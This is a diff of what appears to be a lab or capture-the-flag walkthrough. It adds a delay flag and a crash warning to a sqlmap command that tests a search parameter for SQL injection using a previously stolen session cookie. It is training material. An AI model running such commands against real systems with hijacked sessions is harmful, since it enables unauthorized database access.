@@ -137,12 +137,14 @@ If you are using the attacking machine that was provided to you, sqlmap is alrea
 To check if the "name" parameter is vulnerable it is necessary to set the session (previously stolen) to allow sqlmap to see the /search page, to do this you need to use the following command:
 
 ```
-sqlmap -u "http://193.20.1.2:5000/search?nome=mela" -p nome --cookie="session=STOLEN_SESSION"
+sqlmap -u "http://193.20.1.2:5000/search?nome=mela" -p nome --cookie="session=STOLEN_SESSION" --delay 3
 ```
 
 * `-u`: Target Url
 * `-p`: Testable parameter(s)
 * `--cookie`: HTTP cookie header value
+
+:warning: **WARNING** :warning:: the application may crash due to too many requests from sqlmap. Therefore it is recommended to set a delay of at least 3 seconds (`--delay 3`).
 
 After that we can proceed to inspect the databases:
 
